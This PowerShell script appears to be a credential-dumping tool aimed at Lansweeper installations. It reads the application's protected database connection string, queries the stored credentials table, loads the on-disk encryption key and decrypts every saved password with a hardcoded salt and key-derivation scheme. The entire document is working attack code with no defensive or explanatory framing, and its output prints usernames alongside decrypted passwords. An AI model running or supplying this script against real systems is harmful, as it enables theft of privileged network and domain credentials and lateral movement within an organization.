﻿Add-Type -AssemblyName System.Configuration
Add-Type -AssemblyName System.Web

function Decrypt-Password {
    param(
        [byte[]]$Key,
        [string]$CipherText
    )
    $Salt = [byte[]](39,15,41,17,43,19,45,21)
    $Iter = 10000
    $AESKeySize = 16
    $pb = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($Key, $Salt, $Iter)
    $AESKey = $pb.GetBytes($AESKeySize)
    $tmp = [Convert]::FromBase64String($CipherText)
    $iv = $tmp[0..15]
    $blob = $tmp[16..($tmp.Length - 1)]
    $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
    $aes.Key = $AESKey
    $aes.IV = $iv
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $decryptor = $aes.CreateDecryptor()
    $memoryStream = New-Object System.IO.MemoryStream($blob, 0, $blob.Length)
    $cryptoStream = New-Object System.Security.Cryptography.CryptoStream($memoryStream, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Read)
    $streamReader = New-Object System.IO.StreamReader($cryptoStream)
    $password = $streamReader.ReadToEnd()
    $streamReader.Close()
    $cryptoStream.Close()
    $memoryStream.Close()
    return $password
}

Write-Host "[+] Loading web.config file..."
$fileMap = New-Object System.Configuration.ExeConfigurationFileMap
$fileMap.ExeConfigFilename = "C:\Program Files (x86)\Lansweeper\Website\web.config"

$configuration = [System.Configuration.ConfigurationManager]::OpenMappedExeConfiguration($fileMap, [System.Configuration.ConfigurationUserLevel]::None)

$connectionStringsSection = $configuration.GetSection("connectionStrings")

if ($connectionStringsSection -ne $null -and $connectionStringsSection.SectionInformation.IsProtected) {
    Write-Host "[+] Found protected connectionStrings section. Decrypting..."
    $decryptedSectionXml = $connectionStringsSection.SectionInformation.GetRawXml()
    Write-Host "[+] Decrypted connectionStrings section:"
    Write-Output $decryptedSectionXml
    
    [xml]$xml = $decryptedSectionXml
    $connectionString = $xml.connectionStrings.add.connectionString
    
    $connection = New-Object System.Data.SqlClient.SqlConnection($connectionString)

    try {
        Write-Host "[+] Opening connection to the database..."
        $connection.Open()

        $query = "SELECT credname, username, password FROM lansweeperdb.dbo.tsysCredentials"
        $command = $connection.CreateCommand()
        $command.CommandText = $query

        Write-Host "[+] Retrieving credentials from the database..."
        $reader = $command.ExecuteReader()
        $credentialsList = New-Object System.Collections.Generic.List[Object]

        $encryptionKeyPath = "C:\Program Files (x86)\Lansweeper\Key\Encryption.txt"
        $Key = [System.IO.File]::ReadAllBytes($encryptionKeyPath)

        while ($reader.Read()) {
            $credname = $reader["credname"]
            $username = $reader["username"]
            $encryptedPassword = $reader["password"]
            if (![string]::IsNullOrWhiteSpace($encryptedPassword)) {
                Write-Host "[+] Decrypting password for user: $username"
                $password = Decrypt-Password -Key $Key -CipherText $encryptedPassword
                $credentialObject = New-Object PSObject -Property @{
                    CredName = $credname
                    Username = $username
                    Password = $password
                }
                $credentialsList.Add($credentialObject)
            }
        }

        Write-Host "[+] Credentials retrieved and decrypted successfully:"
        $credentialsList | Format-Table CredName, Username, @{Name='Password';Expression={$_.Password};FormatString='********'} -AutoSize
        
    } catch {
        Write-Host "[ERROR] An error occurred: $_"
    } finally {
        if ($reader -ne $null -and !$reader.IsClosed) {
            $reader.Close()
            Write-Host "[+] Reader closed."
        }
        if ($connection.State -eq 'Open') {
            $connection.Close()
            Write-Host "[+] Database connection closed."
        }
    }
} else {
    Write-Host "[ERROR] The connectionStrings section is either not encrypted or not found."
}

